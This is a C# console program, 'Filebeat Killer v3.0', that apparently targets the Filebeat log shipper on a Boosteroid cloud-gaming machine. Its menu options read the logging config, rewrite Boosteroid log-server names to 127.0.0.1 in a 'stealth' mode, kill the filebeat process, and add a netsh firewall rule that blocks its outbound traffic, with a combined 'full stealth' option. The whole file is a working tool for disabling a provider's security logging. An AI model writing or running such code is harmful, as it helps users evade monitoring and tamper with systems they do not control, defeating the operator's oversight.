using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading;

class FilebeatKiller
{
    static string LOG = "";
    static string FILEBEAT_EXE = "C:\\Users\\user\\boosteroid-experience\\misc\\fb\\filebeat.exe";
    static string FILEBEAT_CONFIG = "C:\\Users\\user\\boosteroid-conf\\filebeat.yml";
    static string STORAGE = "S:\\";
    
    static void Main()
    {
        try
        {
            LOG = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "filebeat_kill.txt");
            
            File.WriteAllText(LOG, "=== FILEBEAT KILLER v3.0 ===\r\n");
            File.AppendAllText(LOG, "Time: " + DateTime.Now.ToString() + "\r\n\r\n");
            
            Console.Title = "Filebeat Killer v3.0";
            Console.WriteLine(@"
╔════════════════════════════════════╗
║   FILEBEAT KILLER v3.0            ║
╚════════════════════════════════════╝

[1] Read config file
[2] Redirect to localhost (STEALTH)
[3] Block network (FIREWALL)
[4] Full combo (2+3)
[5] Exit

Choice: ");
            
            char choice = Console.ReadKey().KeyChar;
            Console.WriteLine("\n");
            
            if (choice == '1')
            {
                ReadConfig();
            }
            else if (choice == '2')
            {
                RedirectConfig();
            }
            else if (choice == '3')
            {
                BlockNetwork();
            }
            else if (choice == '4')
            {
                FullCombo();
            }
            else
            {
                Console.WriteLine("[!] Exiting...");
                return;
            }
            
            Console.WriteLine("\n[+] Done! Log: " + LOG);
            Console.WriteLine("\nPress ANY KEY...");
            Console.ReadKey();
        }
        catch (Exception ex)
        {
            Console.WriteLine("ERROR: " + ex.Message);
            Log("ERROR: " + ex.ToString());
            Console.ReadKey();
        }
    }
    
    static void ReadConfig()
    {
        Console.WriteLine("[*] Reading filebeat config...\n");
        Log("[READ CONFIG]");
        
        if (!File.Exists(FILEBEAT_CONFIG))
        {
            Console.WriteLine("  [!] Config not found: " + FILEBEAT_CONFIG);
            Log("Config not found");
            return;
        }
        
        try
        {
            string[] lines = File.ReadAllLines(FILEBEAT_CONFIG);
            
            Console.WriteLine("  [+] Config found! Total lines: " + lines.Length.ToString());
            Console.WriteLine("\n  --- FILEBEAT CONFIG ---");
            
            Log("Config path: " + FILEBEAT_CONFIG);
            Log("Total lines: " + lines.Length.ToString());
            Log("\n--- CONFIG CONTENT ---");
            
            foreach (string line in lines)
            {
                Console.WriteLine("  " + line);
                Log(line);
            }
            
            Console.WriteLine("  --- END ---");
            Log("--- END ---");
        }
        catch (Exception ex)
        {
            Console.WriteLine("  [!] Cannot read: " + ex.Message);
            Log("Read error: " + ex.Message);
        }
    }
    
    static void RedirectConfig()
    {
        Console.WriteLine("[*] Redirecting filebeat config...\n");
        Log("\n[REDIRECT CONFIG]");
        
        if (!File.Exists(FILEBEAT_CONFIG))
        {
            Console.WriteLine("  [!] Config not found!");
            Log("Config not found");
            return;
        }
        
        try
        {
            // Backup
            string backup = FILEBEAT_CONFIG + ".bak";
            File.Copy(FILEBEAT_CONFIG, backup, true);
            Console.WriteLine("  [+] Backup: " + backup);
            Log("Backup: " + backup);
            
            // Read
            string config = File.ReadAllText(FILEBEAT_CONFIG);
            
            // Replace servers
            string[] servers = new string[] {
                "boosteroid.com",
                "elastic.boosteroid",
                "logstash.boosteroid",
                "logs.boosteroid"
            };
            
            int changes = 0;
            foreach (string server in servers)
            {
                if (config.Contains(server))
                {
                    config = config.Replace(server, "127.0.0.1");
                    Console.WriteLine("  [+] Replaced: " + server + " -> 127.0.0.1");
                    Log("Replaced: " + server);
                    changes++;
                }
            }
            
            if (changes > 0)
            {
                // Save
                File.WriteAllText(FILEBEAT_CONFIG, config);
                Console.WriteLine("\n  [+] Config modified (" + changes.ToString() + " changes)");
                Log("Modified: " + changes.ToString() + " changes");
                
                // Kill filebeat to reload
                Console.WriteLine("  [*] Killing filebeat...");
                KillFilebeat();
                Thread.Sleep(2000);
                
                Console.WriteLine("  [+] Filebeat will restart automatically");
                Console.WriteLine("  [!] Logs now go to localhost!");
                Log("SUCCESS: Redirected");
            }
            else
            {
                Console.WriteLine("  [!] No servers found in config");
                Log("No servers found");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("  [!] Failed: " + ex.Message);
            Log("Failed: " + ex.Message);
        }
    }
    
    static void BlockNetwork()
    {
        Console.WriteLine("[*] Blocking filebeat network...\n");
        Log("\n[BLOCK NETWORK]");
        
        try
        {
            // Remove old rule
            RunCommand("netsh advfirewall firewall delete rule name=\"BlockFilebeat\"");
            
            // Block outbound
            string cmd = "netsh advfirewall firewall add rule name=\"BlockFilebeat\" dir=out action=block program=\"" + FILEBEAT_EXE + "\" enable=yes";
            RunCommand(cmd);
            
            Console.WriteLine("  [+] Firewall rule created");
            Console.WriteLine("  [!] Filebeat network BLOCKED!");
            Log("Firewall: Blocked");
        }
        catch (Exception ex)
        {
            Console.WriteLine("  [!] Failed: " + ex.Message);
            Log("Firewall failed: " + ex.Message);
        }
    }
    
    static void FullCombo()
    {
        Console.WriteLine("[*] FULL STEALTH COMBO...\n");
        Log("\n[FULL COMBO]");
        
        RedirectConfig();
        Console.WriteLine("");
        BlockNetwork();
        
        Console.WriteLine("\n[+] FULL STEALTH ACTIVE!");
        Log("SUCCESS: Full combo");
    }
    
    static void KillFilebeat()
    {
        try
        {
            Process[] procs = Process.GetProcessesByName("filebeat");
            foreach (Process p in procs)
            {
                p.Kill();
            }
        }
        catch { }
    }
    
    static void RunCommand(string cmd)
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = "/c " + cmd;
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            
            Process proc = Process.Start(psi);
            if (proc != null)
            {
                proc.WaitForExit();
            }
        }
        catch { }
    }
    
    static void Log(string msg)
    {
        try
        {
            File.AppendAllText(LOG, msg + "\r\n");
        }
        catch { }
    }
}